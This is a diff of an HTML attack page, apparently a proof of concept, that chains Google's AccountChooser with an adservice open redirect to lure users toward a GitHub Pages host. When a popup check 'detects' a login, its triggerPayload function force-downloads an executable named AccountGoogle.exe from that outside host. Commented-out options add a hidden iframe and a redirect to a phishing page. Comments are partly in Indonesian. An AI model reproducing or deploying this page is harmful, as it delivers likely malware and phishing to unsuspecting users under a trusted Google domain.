@@ -2,76 +2,71 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>XS-Leaks Login Detector</title>
+  <title>XS-Leak PoC - Google Signinchooser Exploit</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       text-align: center;
       margin-top: 50px;
-      background-color: #f5f5f5;
+      background-color: #f0f0f0;
     }
     #status {
+      margin-top: 20px;
       font-size: 18px;
       color: #333;
-      margin-top: 20px;
     }
   </style>
 </head>
 <body>
 
 <h1>Checking Google Login Status...</h1>
-<div id="status">Detecting...</div>
+<div id="status">Detecting login state...</div>
 
 <script>
   const statusDiv = document.getElementById('status');
 
-  // Step 1: Open Google Login in Popup (XS-Leaks trigger)
   function checkGoogleLogin() {
-    const popupURL = 'https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0';
+    // URL kerentanan yang lo kasih
+    const googleLoginURL = 'https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0';
+
     const popupWidth = 500;
     const popupHeight = 600;
     const left = (screen.width / 2) - (popupWidth / 2);
     const top = (screen.height / 2) - (popupHeight / 2);
 
-    let loginPopup = window.open(
-      popupURL,
+    const popup = window.open(
+      googleLoginURL,
       'GoogleLoginPopup',
       `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`
     );
 
-    // Step 2: Use timing-based detection for login status (XS-Leak core)
-    setTimeout(() => {
+    // Tunggu respon popup
+    const checkPopupClosed = setInterval(() => {
       try {
-        // If popup already closed fast → likely logged in (redirected fast)
-        if (loginPopup.closed) {
-          statusDiv.innerText = '✅ Google Account Detected!';
-          triggerAttack();
-        } else {
-          // If popup stuck open → not logged in or blocking
-          statusDiv.innerText = '❌ No Google Login Detected!';
-          loginPopup.close();
+        if (popup.closed) {
+          clearInterval(checkPopupClosed);
+          statusDiv.innerText = '✅ Google Login Detected! Triggering payload...';
+          triggerPayload();
         }
-      } catch (err) {
-        // Cross-origin access error, might be redirect triggered → assume logged in
-        statusDiv.innerText = '✅ Google Account Detected!';
-        triggerAttack();
+      } catch (e) {
+        // Kalau cross-origin access error, bisa asumsikan redirect berhasil
+        clearInterval(checkPopupClosed);
+        statusDiv.innerText = '✅ Google Login Detected! Triggering payload...';
+        triggerPayload();
       }
-    }, 1500); // Timing matters! Experiment with this delay (500-1500ms)
+    }, 1500); // bisa disesuaikan delay-nya, 1000-1500ms ideal
   }
 
-  // Step 3: Trigger the malicious action (Download EXE, redirect, etc)
-  function triggerAttack() {
-    statusDiv.innerText += '\nLaunching payload...';
-
-    // Option 1: Force download an executable
+  function triggerPayload() {
+    // Opsi utama → trigger download .exe dari GitHub
     const a = document.createElement('a');
     a.href = 'https://lanaya113505.github.io/pizza/AccountGoogle.exe';
-    a.download = 'AccountGoogle.exe'; // This triggers "Save As" in most browsers
+    a.download = 'AccountGoogle.exe'; // Prompt download otomatis
     document.body.appendChild(a);
     a.click();
     a.remove();
 
-    // Option 2: Hidden iframe for silent redirect or requests
+    // Opsional lain, hidden iframe buat stealth
     /*
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
@@ -79,11 +74,11 @@
     document.body.appendChild(iframe);
     */
 
-    // Option 3: Redirect user (phishing or auto exploit)
+    // Atau redirect user ke halaman phishing/exploit lain
     // window.location.href = 'https://lanaya113505.github.io/phishing.html';
   }
 
-  // Start XS-Leak detection immediately
+  // Mulai cek login state
   checkGoogleLogin();
 </script>
 
